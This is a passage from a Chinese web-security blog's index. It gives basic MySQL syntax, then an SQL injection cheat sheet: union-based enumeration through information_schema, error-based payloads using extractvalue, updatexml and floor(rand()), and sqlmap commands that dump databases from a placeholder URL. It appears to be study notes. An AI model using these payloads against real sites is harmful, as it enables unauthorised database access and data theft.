id="查询数据库中的表："><a href="#查询数据库中的表：" class="headerlink" title="查询数据库中的表："></a>查询数据库中的表：</h2><p>show tables;</p><h2 id="创建表："><a href="#创建表：" class="headerlink" title="创建表："></a>创建表：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [表名]</span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">id <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line">name <span class="type">varchar</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="更改数据表名："><a href="#更改数据表名：" class="headerlink" title="更改数据表名："></a>更改数据表名：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> [原数据表名] <span class="keyword">to</span> [新数据表名]</span><br></pre></td></tr></table></figure><h2 id="向数据表中插入数据："><a href="#向数据表中插入数据：" class="headerlink" title="向数据表中插入数据："></a>向数据表中插入数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> [数据表名]  (id ,name,age) <span class="keyword">values</span> (<span class="number">1</span>,&quot;tom&quot; <span class="number">19</span>);</span><br></pre></td></tr></table></figure><h2 id="向数据表中擦插入新的列："><a href="#向数据表中擦插入新的列：" class="headerlink" title="向数据表中擦插入新的列："></a>向数据表中擦插入新的列：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [数据表名] [列名] [列的数据类型]；</span><br></pre></td></tr></table></figure><h2 id="更改数据表中的数据："><a href="#更改数据表中的数据：" class="headerlink" title="更改数据表中的数据："></a>更改数据表中的数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> [数据表名] <span class="keyword">set</span> name<span class="operator">=</span>&quot;lisa&quot; <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--修改id=1的行name为lisa</span></span><br></pre></td></tr></table></figure><h2 id="删除数据表中的列："><a href="#删除数据表中的列：" class="headerlink" title="删除数据表中的列："></a>删除数据表中的列：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [数据表名] <span class="keyword">drop</span> [列名]</span><br></pre></td></tr></table></figure><h2 id="删除数据表中的行："><a href="#删除数据表中的行：" class="headerlink" title="删除数据表中的行："></a>删除数据表中的行：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [数据表名] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除id=1的行</span></span><br></pre></td></tr></table></figure><h2 id="查询数据表的包涵数据："><a href="#查询数据表的包涵数据：" class="headerlink" title="查询数据表的包涵数据："></a>查询数据表的包涵数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> [数据表名] <span class="keyword">where</span> id <span class="keyword">in</span> (‘<span class="number">3</span>’)；</span><br><span class="line"></span><br><span class="line"><span class="comment">--在数据表中查询id中包涵‘3’的数据</span></span><br></pre></td></tr></table></figure><h2 id="联合查询："><a href="#联合查询：" class="headerlink" title="联合查询："></a>联合查询：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  country <span class="keyword">from</span> [数据表名<span class="number">1</span>] <span class="keyword">union</span> <span class="keyword">select</span> country <span class="keyword">from</span> [数据表名<span class="number">2</span>] <span class="keyword">order</span> country;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查询数据表1和数据表2中不同的country</span></span><br></pre></td></tr></table></figure><h2 id="排序："><a href="#排序：" class="headerlink" title="排序："></a>排序：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--asc升序，desc降序</span></span><br></pre></td></tr></table></figure><h1 id="注入："><a href="#注入：" class="headerlink" title="注入："></a>注入：</h1><h2 id="数字-字符型注入："><a href="#数字-字符型注入：" class="headerlink" title="数字&#x2F;字符型注入："></a>数字&#x2F;字符型注入：</h2><h3 id="判断："><a href="#判断：" class="headerlink" title="判断："></a>判断：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><h3 id="查询网站所用数据表列数："><a href="#查询网站所用数据表列数：" class="headerlink" title="查询网站所用数据表列数："></a>查询网站所用数据表列数：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> x;</span><br><span class="line"></span><br><span class="line"><span class="comment">--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数</span></span><br></pre></td></tr></table></figure><h3 id="查询网站所用数据数据库"><a href="#查询网站所用数据数据库" class="headerlink" title="查询网站所用数据数据库"></a>查询网站所用数据数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--select 后面的数量要与users列数相同</span></span><br></pre></td></tr></table></figure><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata（查库）</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/03adab05919941189102ef074eb877ae.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>库名（查表)</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/0750bef379b94e94861a46b764063d25.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>[数据库名] <span class="keyword">and</span> table_name<span class="operator">=</span>[表名]（查列）</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/86afe7800fab4b8a875adb17e3eb653a.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> 库名.表名（查数据)</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/274c6c2ae5ce494b9adf0b52bf3144f9.png" alt="img"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id<span class="operator">=</span><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：id=&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()))))</span><br><span class="line"></span><br><span class="line">爆字段名：id<span class="operator">=</span><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：id=&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(COIUMN_NAME) <span class="keyword">from</span> TABLE_NAME))))</span><br></pre></td></tr></table></figure><p>① 0x7e&#x3D;’<del>’<br> ② concat(‘a’,‘b’)&#x3D;“ab”<br> ③ version()&#x3D;@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：<span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line">爆列名：<span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(COLUMN_NAME)<span class="keyword">from</span> TABLE_NAME)),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="floor-："><a href="#floor-：" class="headerlink" title="floor()："></a><strong>floor()：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：<span class="string">&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>) ,&quot; &quot;,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br><span class="line"></span><br><span class="line">爆列名：<span class="string">&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> TABLE_NAME limit <span class="number">0</span>,<span class="number">1</span>) ,&quot; &quot;,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure><h1 id="sqlmap使用："><a href="#sqlmap使用：" class="headerlink" title="sqlmap使用："></a>sqlmap使用：</h1><p>1、查看所有「数据库」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs</p><p>2.查看「数据表」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D [数据库名] –tables</p><p>3.查看「数据」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D [数据库名] -T [数据库表名] –dump</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
